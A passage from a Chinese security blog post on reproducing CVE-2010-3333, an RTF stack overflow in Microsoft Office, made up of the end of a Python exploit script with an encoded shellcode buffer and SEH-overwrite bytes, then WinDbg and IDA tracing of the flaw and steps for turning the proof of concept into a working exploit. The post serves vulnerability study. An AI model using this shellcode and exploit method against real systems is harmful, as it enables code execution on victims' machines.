class="string">"\xc9\xb1\x43\x31\x56\x15\x83\xee\xfc\x03\x56\x11\xe2"</span></span><br><span class="line">buf += <span class="string">"\x48\x36\x5a\x48\x6b\xbd\xb9\x9b\xba\xec\x70\x14\x8d"</span></span><br><span class="line">buf += <span class="string">"\xd9\x11\x50\x9c\xe9\x52\x10\x52\x81\x13\xc1\xe1\xd3"</span></span><br><span class="line">buf += <span class="string">"\xd3\x72\x8b\xfb\x68\xb2\x4b\xb3\x76\xce\x58\x12\x86"</span></span><br><span class="line">buf += <span class="string">"\xe1\x61\x44\xe8\x8a\xf1\xa3\xcd\x07\x4c\x90\x86\x4c"</span></span><br><span class="line">buf += <span class="string">"\x66\x90\x99\x86\xfd\x2a\x82\xdd\x5b\x8b\xb3\x0a\xb8"</span></span><br><span class="line">buf += <span class="string">"\xff\xfa\x47\x0a\x8b\xfc\xb9\x43\x74\xcf\x85\x5f\x26"</span></span><br><span class="line">buf += <span class="string">"\xb4\xc6\xeb\x30\x74\x09\x1e\x3e\xb1\x7d\xd4\x7b\x41"</span></span><br><span class="line">buf += <span class="string">"\xa6\x3c\x09\x58\x2d\x66\xd5\x9b\xd9\xf0\x9e\x90\x56"</span></span><br><span class="line">buf += <span class="string">"\x77\xfa\xb4\x69\x6c\x70\xc0\xe2\x73\x6f\x40\xb0\x57"</span></span><br><span class="line">buf += <span class="string">"\x73\x32\xfa\x25\x83\x9d\x28\xc0\x71\x54\x12\xba\xf7"</span></span><br><span class="line">buf += <span class="string">"\x29\x9d\xd6\x5a\x5e\x3e\xd9\xa4\x61\xc8\x60\x5f\x25"</span></span><br><span class="line">buf += <span class="string">"\xb5\xb2\xbd\x2a\xcd\x5e\x66\x9f\x39\xd0\x99\xe0\x45"</span></span><br><span class="line">buf += <span class="string">"\x65\x20\x17\xd2\x19\xc7\x07\x63\x89\x24\x7a\x4d\x2d"</span></span><br><span class="line">buf += <span class="string">"\x23\x0f\xe2\xc8\xc1\xdf\xdf\x9a\x7a\x04\xea\x13\x64"</span></span><br><span class="line">buf += <span class="string">"\x12\x15\x76\x6d\x12\x2b\x28\xd6\x8c\x0e\x85\x94\x4a"</span></span><br><span class="line">buf += <span class="string">"\x52\x31\xb7\xbc\x34\xc6\xc8\xc2\xa3\x57\x4f\x65\x14"</span></span><br><span class="line">buf += <span class="string">"\xcf\xce\xf2\x31\x4d\x79\xb0\xdc\x22\x0a\x7b\xc4\x4c"</span></span><br><span class="line">buf += <span class="string">"\xb0\x5f\xf0\xc5\xaa\xc8\x5c\xf5\x0c\x29\x35\x87\x20"</span></span><br><span class="line">buf += <span class="string">"\x4d\xe4\x0f\xd6\xad\x91\xa0\x40\xc6\x38\x52\xfd\x27"</span></span><br><span class="line">buf += <span class="string">"\x0a\x22\xb1\x63\x80\xbb\xab\x5d\x4a\xe9\x78\xcf\x38"</span></span><br><span class="line">buf += <span class="string">"\xf2\xaf\xde\x7c\x5c\xaf\x74\x75"</span></span><br><span class="line">filedata=<span class="string">"A"</span>*<span class="number">29600</span>+buf</span><br><span class="line">filedata = filedata.ljust(<span class="number">30000</span>,<span class="string">"B"</span>)</span><br><span class="line">filedata +=<span class="string">'\x60\x46\x8a\x74'</span>+<span class="string">"c"</span>*<span class="number">257</span>+<span class="string">"\xeb\x06\x90\x90"</span> + <span class="string">'\x44\x13\x02\x50'</span>+<span class="string">'\xe9\xff\xfc\xff\xff'</span></span><br><span class="line">myfile.write(filedata) </span><br><span class="line">myfile.close()</span><br></pre></td></tr></table></figure>
<h1 id="Office-2007的漏洞复现"><a href="#Office-2007的漏洞复现" class="headerlink" title="Office 2007的漏洞复现"></a>Office 2007的漏洞复现</h1><p>PoC仍然使用2003的PoC。</p>
<h2 id="定位漏洞-1"><a href="#定位漏洞-1" class="headerlink" title="定位漏洞"></a>定位漏洞</h2><p>1.打开word，用windbg.exe -g -p pid附加到winword.exe<br>2.打开msf.rtf(同2003)，停在：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(240.a54): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=3c524228 ebx=00000000 ecx=0017ff5c edx=00000000 esi=034f0600 edi=00180118</span><br><span class="line">eip=32cf3814 esp=0017ff10 ebp=0017ff10 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206</span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Common Files\Microsoft Shared\office12\mso.dll - </span><br><span class="line">mso!Ordinal7356+0x1315:</span><br><span class="line">32cf3814 8b4804          mov     ecx,dword ptr [eax+4] ds:002b:3c52422c=????????</span><br></pre></td></tr></table></figure>
<p>在32cf3814的指令中，eax+4不是一个合法地址。通过汇编窗口向上回溯eax的来源：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">32cf37f8 0000            add     byte ptr [eax],al</span><br><span class="line">32cf37fa 34c2            xor     al,0C2h</span><br><span class="line">32cf37fc 0000            add     byte ptr [eax],al</span><br><span class="line">32cf37fe 3442            xor     al,42h</span><br><span class="line">32cf3800 b301            mov     bl,1</span><br><span class="line">32cf3802 e97cffffff      jmp     mso!Ordinal7356+0x1284 (32cf3783)</span><br><span class="line">32cf3807 55              push    ebp</span><br><span class="line">32cf3808 8bec            mov     ebp,esp</span><br><span class="line">32cf380a 8b450c          mov     eax,dword ptr [ebp+0Ch]</span><br><span class="line">32cf380d 8d04c52038cf32  lea     eax,mso!Ordinal7356+0x1321 (32cf3820)[eax*8]</span><br><span class="line">32cf3814 8b4804          mov     ecx,dword ptr [eax+4] ds:002b:3c52422c=????????</span><br></pre></td></tr></table></figure>
<p>上一条指令里对eax进行了赋值：<code>eax = *(0x32cf3820+eax*8)</code>，其中<code>eax=[ebp+0xc]</code>，也就是调用当前函数时传入的第二个参数arg2。根据calls窗口，找到调用当前函数（简称为Ordinal7356)的位置：</p>
<p><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/g.png" alt=""></p>
<p>可见在Ordinal2605中调用了Ordianal7356，压入的第二个参数为[ebp+8]，即这个值是上一个函数传入的第一个参数，接着通过calls回溯：</p>
<p><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/h.png" alt=""></p>
<p>在Ordinal2605+0x33db调用了Ordial2605+0x323c，arg1为ebp-0x10，是一个局部变量。为了回溯这个变量，使用IDA查看：</p>
<p><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/i.png" alt=""></p>
<p>在调用[eax+0x1c]时，ebp-0x10作为arg2，这里有可能对它进行修改。</p>
<p>3.重新进入调试，在32e595a1下断点并进入：</p>
<p><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/j.png" alt=""></p>
<p>由于windbg需要符号表(pdb)才能对函数名进行解析，我的windbg比较原始，就用IDA来辅助查看：</p>
<p><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/k.png" alt=""></p>
<p>通过memcpy向dst复制，复制的size就是传入的第二个参数，由于没有检查size的大小，造成了栈溢出。运行到memcpy之前查看dst的地址为0x17ff54。通过!exchain查看SEH链：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !exchain</span><br><span class="line">0018698: 37714836</span><br><span class="line">Invalid exception stack at 71482571</span><br></pre></td></tr></table></figure>
<p>说明next SEH 0x181698处被覆盖为了0x71483571，由此可以确定溢出点和SEH之间的距离为0x1744.</p>
<p>4.总结一下就是，在327c00c函数中，memcpy没有对size进行检查。可以利用这个漏洞，覆盖掉这个函数的返回地址为无效地址，从而触发SEH异常处理，进而执行我们事先准备好的shellcode。</p>
<h2 id="生成EXP-1"><a href="#生成EXP-1" class="headerlink" title="生成EXP"></a>生成EXP</h2><p>修改msf.rtf，把next SEH处修改为jmp 6；SEH handler修改为pop pop retn的gadget。</p>
<p>其中gadget的查找方式是在OD中，通过SAFESEH插件查看哪些模块没有开启SEH保护，即/safeseh off。在这样的库中通过ctrl+s查找gadget。这里用的是ntdll.dll中的0x78e5131d</p>
<p>shellcode则是利用seh_test中的shellcode，用encode(‘hex’)转换为普通字符。</p>
<p><img src="/2019/01/31/CVE-2010-3333栈溢出漏洞复现新手向/l.png" alt=""></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次复现是通过PoC反向推漏洞点，再修改PoC为EXP。对于这种大型软件的漏洞，很难做到搞懂软件的代码，而且Office并不开源，读IDA中的反编译也有一定难度。这次我只是做了简单的复现，探究的也很浅。希望后续的漏洞复现能够继续深入，在掌握软件的基本逻辑后再探究漏洞的复现，效果会更好些。</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/漏洞复现/" rel="tag"># 漏洞复现</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/01/04/2018鹏城杯pwn/" rel="next" title="2018鹏城杯pwn">
                <i class="fa fa-chevron-left"></i> 2018鹏城杯pwn
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/" rel="prev" title="Exim Off by one CVE-2018-6789漏洞复现">
                Exim Off by one CVE-2018-6789漏洞复现 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/uploads/avatar.jpg"
                alt="0gur1" />
            
              <p class="site-author-name" itemprop="name">0gur1</p>
              <p class="site-description motion-element" itemprop="description">Stay hungry.Stay foolish.</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">24</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#写在前面"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Office-2003的漏洞复现"><span class="nav-number">2.</span> <span class="nav-text">Office 2003的漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#rtf文件格式"><span class="nav-number">2.1.</span> <span class="nav-text">rtf文件格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#定位漏洞"><span class="nav-number">2.2.</span> <span class="nav-text">定位漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#生成EXP"><span class="nav-number">2.3.</span> <span class="nav-text">生成EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SEH知识及利用"><span class="nav-number">3.</span> <span class="nav-text">SEH知识及利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#关于SEH"><span class="nav-number">3.1.</span> <span class="nav-text">关于SEH</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SEH的利用"><span class="nav-number">3.2.</span> <span class="nav-text">SEH的利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Office-2007的漏洞复现"><span class="nav-number">4.</span> <span class="nav-text">Office 2007的漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#定位漏洞-1"><span class="nav-number">4.1.</span> <span class="nav-text">定位漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#生成EXP-1"><span class="nav-number">4.2.</span> <span class="nav-text">生成EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">0gur1</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>



<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客量:<span id="busuanzi_value_site_uv"></span>
</span>
</div>
        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("KvkboNezCqOpWaIBvOMgJE3K-gzGzoHsz", "slQuYxW7tjbda9dyxmi3dY4o");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  
  

  

  

  

</body>
</html>
